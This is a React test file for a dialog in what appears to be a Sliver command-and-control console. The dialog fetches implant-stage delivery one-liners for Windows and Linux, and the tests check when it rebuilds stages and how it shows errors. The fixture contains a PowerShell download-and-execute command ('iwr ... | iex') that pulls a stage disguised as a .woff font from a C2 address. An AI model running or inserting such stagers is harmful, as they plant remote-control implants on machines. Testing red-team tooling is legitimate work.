import { describe, it, expect, vi, beforeEach } from 'vitest'
import { render, screen, fireEvent, waitFor } from '@testing-library/react'
import OneLinerDialog from '../OneLinerDialog'
import { api } from '../../../lib/api'
import type { Job, MultiOneLinerResult } from '../../../lib/types'

vi.mock('../../../lib/api', () => ({
  api: {
    oneLinerAll: vi.fn(),
  },
}))

const mockedApi = vi.mocked(api)

function job(over: Partial<Job> = {}): Job {
  return { ID: 4, Name: 'http', Protocol: 'http', Port: 8888, Domains: [], JobControl: '', ...over }
}

function result(over: Partial<MultiOneLinerResult> = {}): MultiOneLinerResult {
  return {
    command: 'iwr http://10.0.0.1:8888/stage-windows.woff -UseBasicParsing | iex',
    platform: 'windows',
    url: 'http://10.0.0.1:8888/stage-windows.woff',
    delivery: 'psh',
    staged_as: 'stage-windows-4',
    path: '/stage-windows.woff',
    c2_url: 'http://10.0.0.1:8888',
    alternatives: [],
    ...over,
  }
}

/**
 * The row's button opens this dialog to *get a command*, so asking for one on
 * open is the whole contract. It used to open on a "Build Windows and Linux
 * commands" button instead, which meant the operator clicked the row, read a
 * prompt, and clicked again before anything happened -- and closing and
 * re-opening threw the commands away and asked for another two implant builds.
 */
describe('OneLinerDialog', () => {
  beforeEach(() => {
    vi.clearAllMocks()
    mockedApi.oneLinerAll.mockResolvedValue({ results: [result()] })
  })

  it('asks for the commands on open, without a second click', async () => {
    render(<OneLinerDialog job={job()} onClose={() => {}} />)

    await waitFor(() => expect(mockedApi.oneLinerAll).toHaveBeenCalledTimes(1))
    expect(mockedApi.oneLinerAll).toHaveBeenCalledWith({
      job_id: 4,
      platforms: ['windows', 'linux'],
      // Not a rebuild: the backend answers from the stage it built last time.
      force: false,
    })

    expect(await screen.findByDisplayValue(/stage-windows\.woff/)).toBeInTheDocument()
    // The prompt button is gone once the command is on screen.
    expect(
      screen.queryByRole('button', { name: 'Build Windows and Linux commands' }),
    ).not.toBeInTheDocument()
  })

  it('asks again when it is re-opened for the same listener', async () => {
    const { rerender } = render(<OneLinerDialog job={job()} onClose={() => {}} />)
    await waitFor(() => expect(mockedApi.oneLinerAll).toHaveBeenCalledTimes(1))

    rerender(<OneLinerDialog job={null} onClose={() => {}} />)
    rerender(<OneLinerDialog job={job()} onClose={() => {}} />)

    await waitFor(() => expect(mockedApi.oneLinerAll).toHaveBeenCalledTimes(2))
  })

  it('asks again when it is pointed at a different listener', async () => {
    const { rerender } = render(<OneLinerDialog job={job({ ID: 4 })} onClose={() => {}} />)
    await waitFor(() => expect(mockedApi.oneLinerAll).toHaveBeenCalledTimes(1))

    rerender(<OneLinerDialog job={job({ ID: 5, Port: 9999 })} onClose={() => {}} />)

    await waitFor(() => expect(mockedApi.oneLinerAll).toHaveBeenCalledTimes(2))
    expect(mockedApi.oneLinerAll).toHaveBeenLastCalledWith(
      expect.objectContaining({ job_id: 5 }),
    )
  })

  it('only Rebuild asks the backend to build again', async () => {
    render(<OneLinerDialog job={job()} onClose={() => {}} />)
    await screen.findByDisplayValue(/stage-windows\.woff/)

    fireEvent.click(screen.getByRole('button', { name: 'Rebuild' }))

    await waitFor(() =>
      expect(mockedApi.oneLinerAll).toHaveBeenLastCalledWith(
        expect.objectContaining({ force: true }),
      ),
    )
    expect(mockedApi.oneLinerAll).toHaveBeenCalledTimes(2)
  })

  it('says when the command came from an earlier build', async () => {
    mockedApi.oneLinerAll.mockResolvedValue({ results: [result({ reused: true })] })

    render(<OneLinerDialog job={job()} onClose={() => {}} />)

    expect(
      await screen.findByText('Reused the stage built earlier; nothing was rebuilt.'),
    ).toBeInTheDocument()
  })

  it('does not ask for a listener that cannot serve a stage', async () => {
    render(<OneLinerDialog job={job({ Name: 'mtls' })} onClose={() => {}} />)

    expect(mockedApi.oneLinerAll).not.toHaveBeenCalled()
    expect(
      screen.getByText('A mtls listener cannot serve a stage. Only the HTTP family can host files.'),
    ).toBeInTheDocument()
  })

  it('replaces the backend paragraph about an unknown website with an instruction', async () => {
    mockedApi.oneLinerAll.mockResolvedValue({
      results: [
        result({
          command: '',
          url: '',
          error:
            'listener 4 was not started by this console, so the website it serves is unknown. Sliver does not report it: a stage published to the wrong website is invisible to the listener and the delivery URL returns 404. Start the listener from here, or use the WebDelivery page and name the website explicitly',
        }),
      ],
    })

    render(<OneLinerDialog job={job()} onClose={() => {}} />)

    expect(
      await screen.findByText(/This listener was not started from this console/),
    ).toBeInTheDocument()
    expect(screen.queryByText(/Sliver does not report it/)).not.toBeInTheDocument()
  })

  it('prints one banner when every platform failed for the same reason', async () => {
    const message = 'sliver: the server refused the build'
    mockedApi.oneLinerAll.mockResolvedValue({
      results: [
        result({ command: '', url: '', platform: 'windows', error: message }),
        result({ command: '', url: '', platform: 'linux', error: message }),
      ],
    })

    render(<OneLinerDialog job={job()} onClose={() => {}} />)

    // One sentence, not one per platform.
    expect(await screen.findAllByText(message)).toHaveLength(1)
    // Both platforms are still named, so the operator sees what was attempted.
    expect(screen.getByText('Windows')).toBeInTheDocument()
    expect(screen.getByText('Linux')).toBeInTheDocument()
  })

  it('surfaces a failed load and offers the prompt again', async () => {
    mockedApi.oneLinerAll.mockRejectedValue(new Error('no listener with job id 4'))

    render(<OneLinerDialog job={job()} onClose={() => {}} />)

    // The dialog has no listener picker, so the backend sentence about a job id
    // is replaced with something the operator can act on here.
    expect(
      await screen.findByText(
        'This listener is no longer running (it may have been stopped). Close this dialog, refresh the listener list, and pick another.',
      ),
    ).toBeInTheDocument()
    expect(
      screen.getByRole('button', { name: 'Build Windows and Linux commands' }),
    ).toBeInTheDocument()
  })
})
